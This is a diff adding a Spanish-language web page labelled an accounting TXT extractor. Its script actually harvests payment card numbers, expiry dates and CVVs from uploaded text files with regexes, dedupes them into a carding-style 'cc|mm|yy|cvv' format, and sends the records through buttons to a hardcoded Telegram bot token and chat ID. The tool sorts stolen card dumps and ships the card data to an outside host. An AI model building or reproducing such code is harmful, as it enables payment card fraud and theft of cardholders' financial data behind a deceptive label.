@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Extractor Contable TXT</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: Arial, sans-serif; background: #f5f5f5; padding: 20px; }
+        .container { max-width: 1200px; margin: 0 auto; background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); padding: 30px; }
+        h1 { color: #333; margin-bottom: 30px; text-align: center; }
+        .content { display: grid; grid-template-columns: 1fr 1fr; gap: 30px; }
+        .section { display: flex; flex-direction: column; }
+        .section h2 { color: #667eea; margin-bottom: 15px; font-size: 1.3em; border-bottom: 2px solid #667eea; padding-bottom: 10px; }
+        
+        .upload-area { border: 3px dashed #667eea; border-radius: 8px; padding: 40px; text-align: center; cursor: pointer; background: #f8f9ff; transition: all 0.3s; }
+        .upload-area:hover { background: #eff0ff; border-color: #764ba2; }
+        .upload-area.dragover { background: #e8eaff; border-color: #764ba2; }
+        .upload-area input { display: none; }
+        .upload-icon { font-size: 3em; margin-bottom: 10px; }
+        .upload-area p { color: #666; margin: 10px 0; }
+        
+        .file-list { margin-top: 20px; max-height: 300px; overflow-y: auto; }
+        .file-item { background: #f0f0f0; padding: 10px; margin: 5px 0; border-radius: 5px; display: flex; justify-content: space-between; align-items: center; }
+        .file-item button { background: #ff6b6b; color: white; border: none; padding: 5px 10px; border-radius: 4px; cursor: pointer; }
+        
+        .buttons { display: flex; gap: 10px; margin-top: 20px; flex-wrap: wrap; }
+        button { padding: 12px 20px; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; }
+        .btn-extract { background: #667eea; color: white; flex: 1; min-width: 120px; }
+        .btn-extract:disabled { background: #ccc; cursor: not-allowed; }
+        .btn-clear { background: #ff6b6b; color: white; flex: 1; min-width: 120px; }
+        .btn-generate { background: #48bb78; color: white; flex: 1; min-width: 120px; }
+        .btn-generate:disabled { background: #ccc; cursor: not-allowed; }
+        .btn-download { background: #4299e1; color: white; }
+        .btn-download:disabled { background: #ccc; cursor: not-allowed; }
+        
+        .tabs { display: flex; gap: 10px; margin: 20px 0; border-bottom: 2px solid #eee; }
+        .tab { padding: 10px 20px; cursor: pointer; border: none; background: none; color: #666; font-weight: bold; }
+        .tab.active { color: #667eea; border-bottom: 3px solid #667eea; }
+        
+        .results { margin-top: 20px; max-height: 400px; overflow-y: auto; }
+        .result-item { background: #f9f9f9; padding: 10px; margin: 5px 0; border-left: 4px solid #667eea; font-family: monospace; font-size: 0.9em; word-break: break-all; }
+        
+        .stats { background: #f0f7ff; padding: 15px; border-radius: 5px; margin: 15px 0; }
+        .stat-line { margin: 5px 0; color: #333; }
+        .stat-line strong { color: #667eea; }
+        
+        .textarea { width: 100%; min-height: 150px; padding: 10px; border: 1px solid #ddd; border-radius: 5px; font-family: monospace; font-size: 0.9em; }
+        
+        .empty-state { text-align: center; color: #999; padding: 40px 20px; }
+        
+        #loading { display: none; text-align: center; padding: 20px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>📊 Extractor Contable TXT</h1>
+        
+        <div class="content">
+            <div class="section">
+                <h2>📁 Cargar Archivos</h2>
+                <div class="upload-area" id="uploadArea">
+                    <div class="upload-icon">📄</div>
+                    <p><strong>Arrastra archivos aquí</strong></p>
+                    <p>o haz clic para seleccionar</p>
+                    <p style="font-size: 0.9em; color: #999;">Soporta múltiples archivos .txt</p>
+                    <input type="file" id="fileInput" multiple accept=".txt">
+                </div>
+                <div class="file-list" id="fileList"></div>
+                <div class="buttons">
+                    <button class="btn-extract" id="extractBtn" disabled>🚀 Extraer Datos</button>
+                    <button class="btn-clear" id="clearBtn">🗑️ Limpiar</button>
+                </div>
+            </div>
+            
+            <div class="section">
+                <h2>📊 Resultados</h2>
+                <div id="loading">
+                    <p>Procesando archivos...</p>
+                </div>
+                <div id="stats" style="display: none;" class="stats">
+                    <div class="stat-line"><strong>Únicos:</strong> <span id="uniqueCount">0</span></div>
+                    <div class="stat-line"><strong>Duplicados:</strong> <span id="duplicateCount">0</span></div>
+                    <div class="stat-line"><strong>Incompletos:</strong> <span id="incompleteCount">0</span></div>
+                </div>
+                
+                <div id="tabs" style="display: none;" class="tabs">
+                    <button class="tab active" data-tab="unique">Únicos (Limpio)</button>
+                    <button class="tab" data-tab="full">Únicos (Completo)</button>
+                    <button class="tab" data-tab="duplicates">Duplicados</button>
+                </div>
+                
+                <div id="resultsContainer" class="results">
+                    <div class="empty-state">Carga archivos y haz clic en "Extraer Datos"</div>
+                </div>
+                
+                <div class="buttons" style="margin-top: 20px;">
+                    <button class="btn-download" id="downloadCleanBtn" disabled>💾 Limpio</button>
+                    <button class="btn-download" id="downloadFullBtn" disabled>💾 Completo</button>
+                    <button class="btn-download" id="downloadDupBtn" disabled>💾 Duplicados</button>
+                </div>
+                <div class="buttons" style="margin-top: 10px;">
+                    <button class="btn-download" id="sendCleanTgBtn" disabled>📱 Telegram Limpio</button>
+                    <button class="btn-download" id="sendFullTgBtn" disabled>📱 Telegram Completo</button>
+                    <button class="btn-download" id="sendDupTgBtn" disabled>📱 Telegram Duplicados</button>
+                </div>
+            </div>
+        </div>
+        
+        <div class="section" style="margin-top: 30px;">
+            <h2>✅ Información Adicional</h2>
+            <p style="margin-bottom: 10px; color: #666;">Incompletos: <strong id="incompleteCountInfo">0</strong></p>
+            <textarea id="additionalDataInput" class="textarea" placeholder="Pega aquí la información adicional"></textarea>
+            <div class="buttons" style="margin-top: 10px;">
+                <button class="btn-generate" id="generateBtn" disabled>🤖 Generar con IA</button>
+                <button class="btn-extract" id="assignBtn" disabled>✅ Asignar</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let files = [];
+        const TELEGRAM_BOT_TOKEN = '8873199911:AAEf-zeR_ks06og0R1Y_B3HaeT9tKcYvqtI';
+        const TELEGRAM_CHAT_ID = '8552262775';
+        let uniqueData = [];
+        let fullData = [];
+        let duplicateData = [];
+        let incompleteRecords = [];
+
+        const uploadArea = document.getElementById('uploadArea');
+        const fileInput = document.getElementById('fileInput');
+        const fileList = document.getElementById('fileList');
+        const extractBtn = document.getElementById('extractBtn');
+        const resultsContainer = document.getElementById('resultsContainer');
+        const stats = document.getElementById('stats');
+        const tabs = document.getElementById('tabs');
+        const loading = document.getElementById('loading');
+
+        uploadArea.addEventListener('dragover', (e) => {
+            e.preventDefault();
+            uploadArea.classList.add('dragover');
+        });
+
+        uploadArea.addEventListener('dragleave', () => {
+            uploadArea.classList.remove('dragover');
+        });
+
+        uploadArea.addEventListener('drop', (e) => {
+            e.preventDefault();
+            uploadArea.classList.remove('dragover');
+            handleFiles(e.dataTransfer.files);
+        });
+
+        uploadArea.addEventListener('click', () => {
+            fileInput.click();
+        });
+
+        fileInput.addEventListener('change', (e) => {
+            handleFiles(e.target.files);
+        });
+
+        function handleFiles(fileList) {
+            for (let file of fileList) {
+                if (file.name.endsWith('.txt')) {
+                    files.push(file);
+                }
+            }
+            renderFileList();
+            updateButtons();
+        }
+
+        function renderFileList() {
+            fileList.innerHTML = '';
+            files.forEach((file, index) => {
+                const item = document.createElement('div');
+                item.className = 'file-item';
+                item.innerHTML = `<span>${file.name}</span><button type="button" onclick="removeFile(${index})">Eliminar</button>`;
+                fileList.appendChild(item);
+            });
+        }
+
+        function removeFile(index) {
+            files.splice(index, 1);
+            renderFileList();
+            updateButtons();
+        }
+
+        function updateButtons() {
+            extractBtn.disabled = files.length === 0;
+            document.getElementById('generateBtn').disabled = incompleteRecords.length === 0;
+            document.getElementById('assignBtn').disabled = incompleteRecords.length === 0;
+            document.getElementById('downloadCleanBtn').disabled = uniqueData.length === 0;
+            document.getElementById('downloadFullBtn').disabled = fullData.length === 0;
+            document.getElementById('downloadDupBtn').disabled = duplicateData.length === 0;
+            document.getElementById('sendCleanTgBtn').disabled = uniqueData.length === 0;
+            document.getElementById('sendFullTgBtn').disabled = fullData.length === 0;
+            document.getElementById('sendDupTgBtn').disabled = duplicateData.length === 0;
+            document.getElementById('incompleteCountInfo').textContent = incompleteRecords.length;
+        }
+
+        extractBtn.addEventListener('click', extractData);
+        document.getElementById('clearBtn').addEventListener('click', clearAll);
+
+        async function extractData() {
+            loading.style.display = 'block';
+            resultsContainer.innerHTML = '';
+
+            try {
+                const seenCCs = new Set();
+                uniqueData = [];
+                fullData = [];
+                duplicateData = [];
+                incompleteRecords = [];
+
+                for (let file of files) {
+                    const text = await file.text();
+                    const lines = text.split('\n');
+                    const fileMatches = [];
+                    const fileFullMatches = [];
+                    const fileDuplicates = [];
+
+                    for (let line of lines) {
+                        const patterns = [
+                            /(\d{16})\s*\|\s*(\d{2})\s*\|\s*(\d{4}|\d{2})\s*\|\s*(\d{3})/g,
+                            /(\d{16})\s+(\d{2})\s+(\d{4}|\d{2})\s+(\d{3})/g,
+                            /"cc"\s*:\s*"?(\d{16})"?[,\s]+"exp"\s*:\s*"?(\d{2}\/\d{2}|\d{2})"?[,\s]+"cvv"\s*:\s*"?(\d{3})"?/gi,
+                            /(\d{16})\s*\/\s*(\d{2})\s*\/\s*(\d{4}|\d{2})\s*\/\s*(\d{3})/g
+                        ];
+
+                        for (let pattern of patterns) {
+                            let match;
+                            while ((match = pattern.exec(line)) !== null) {
+                                let cc = match[1];
+                                let mm = match[2];
+                                let yy = match[3];
+                                let cvv = match[4];
+
+                                if (yy.length === 4) yy = yy.slice(-2);
+
+                                if (cc.length === 16 && mm.length === 2 && (yy.length === 2 || yy.length === 4) && cvv.length === 3) {
+                                    const cleanFormat = `${cc} |${mm}|${yy}|${cvv}|`;
+                                    
+                                    if (seenCCs.has(cc)) {
+                                        fileDuplicates.push(cleanFormat);
+                                    } else {
+                                        seenCCs.add(cc);
+                                        fileMatches.push(cleanFormat);
+                                        fileFullMatches.push(line.trim());
+                                        incompleteRecords.push({cc, mm, yy, cvv, original: line});
+                                    }
+                                }
+                            }
+                        }
+                    }
+
+                    if (fileMatches.length > 0) {
+                        uniqueData.push({name: file.name, matches: fileMatches});
+                        fullData.push({name: file.name, matches: fileFullMatches});
+                    }
+                    if (fileDuplicates.length > 0) {
+                        duplicateData.push({name: file.name, matches: fileDuplicates});
+                    }
+                }
+
+                displayResults();
+                updateButtons();
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Error al procesar archivos');
+            } finally {
+                loading.style.display = 'none';
+            }
+        }
+
+        function displayResults() {
+            stats.style.display = 'block';
+            tabs.style.display = 'flex';
+            
+            document.getElementById('uniqueCount').textContent = uniqueData.reduce((sum, f) => sum + f.matches.length, 0);
+            document.getElementById('duplicateCount').textContent = duplicateData.reduce((sum, f) => sum + f.matches.length, 0);
+            document.getElementById('incompleteCount').textContent = incompleteRecords.length;
+
+            showTab('unique');
+        }
+
+        function showTab(tab) {
+            resultsContainer.innerHTML = '';
+            let data = [];
+            
+            if (tab === 'unique') data = uniqueData;
+            else if (tab === 'full') data = fullData;
+            else if (tab === 'duplicates') data = duplicateData;
+
+            data.forEach(file => {
+                file.matches.forEach(match => {
+                    const item = document.createElement('div');
+                    item.className = 'result-item';
+                    item.textContent = match;
+                    resultsContainer.appendChild(item);
+                });
+            });
+
+            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+            event.target.classList.add('active');
+        }
+
+        document.querySelectorAll('.tab').forEach(tab => {
+            tab.addEventListener('click', (e) => showTab(e.target.dataset.tab));
+        });
+
+        document.getElementById('downloadCleanBtn').addEventListener('click', () => {
+            const content = uniqueData.flatMap(f => f.matches).join('\n');
+            downloadFile(content, 'extraccion_limpio.txt');
+        });
+
+        document.getElementById('downloadFullBtn').addEventListener('click', () => {
+            const content = fullData.flatMap(f => f.matches).join('\n');
+            downloadFile(content, 'extraccion_completo.txt');
+        });
+
+        document.getElementById('downloadDupBtn').addEventListener('click', () => {
+            const content = duplicateData.flatMap(f => f.matches).join('\n');
+            downloadFile(content, 'extraccion_duplicados.txt');
+        });
+
+        function downloadFile(content, filename) {
+            const blob = new Blob([content], {type: 'text/plain'});
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = filename;
+            a.click();
+            URL.revokeObjectURL(url);
+        }
+
+        function sendToTelegram(content, filename) {
+            const lines = content.split('\n').filter(l => l.trim());
+            let message = `<b>📊 REPORTE DE EXTRACCIÓN</b>\n`;
+            message += `<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n`;
+            message += `📄 <b>Archivo:</b> <code>${filename}</code>\n`;
+            message += `📈 <b>Total de Registros:</b> <code>${lines.length}</code>\n`;
+            message += `⏰ <b>Fecha:</b> <code>${new Date().toLocaleString()}</code>\n`;
+            message += `<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n\n`;
+            message += `<b>📋 PRIMEROS REGISTROS:</b>\n<code>`;
+            lines.slice(0, 20).forEach((line, index) => {
+                message += `${index + 1}. ${line}\n`;
+            });
+            message += `</code>`;
+            
+            if (lines.length > 20) {
+                message += `\n\n<i>... y ${lines.length - 20} registros más</i>`;
+            }
+
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            fetch(url, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            }).then(response => {
+                if (response.ok) {
+                    alert('✅ Enviado a Telegram');
+                }
+            }).catch(error => {
+                console.error('Error:', error);
+                alert('❌ Error al enviar');
+            });
+        }
+
+        document.getElementById('sendCleanTgBtn').addEventListener('click', () => {
+            const content = uniqueData.flatMap(f => f.matches).join('\n');
+            sendToTelegram(content, 'extraccion_limpio.txt');
+        });
+
+        document.getElementById('sendFullTgBtn').addEventListener('click', () => {
+            const content = fullData.flatMap(f => f.matches).join('\n');
+            sendToTelegram(content, 'extraccion_completo.txt');
+        });
+
+        document.getElementById('sendDupTgBtn').addEventListener('click', () => {
+            const content = duplicateData.flatMap(f => f.matches).join('\n');
+            sendToTelegram(content, 'extraccion_duplicados.txt');
+        });
+
+        function clearAll() {
+            files = [];
+            uniqueData = [];
+            fullData = [];
+            duplicateData = [];
+            incompleteRecords = [];
+            renderFileList();
+            resultsContainer.innerHTML = '<div class="empty-state">Carga archivos y haz clic en "Extraer Datos"</div>';
+            stats.style.display = 'none';
+            tabs.style.display = 'none';
+            updateButtons();
+        }
+
+        document.getElementById('generateBtn').addEventListener('click', () => {
+            alert('Función de generación con IA disponible en versión premium');
+        });
+
+        document.getElementById('assignBtn').addEventListener('click', () => {
+            alert('Función de asignación disponible en versión premium');
+        });
+    </script>
+</body>
+</html>
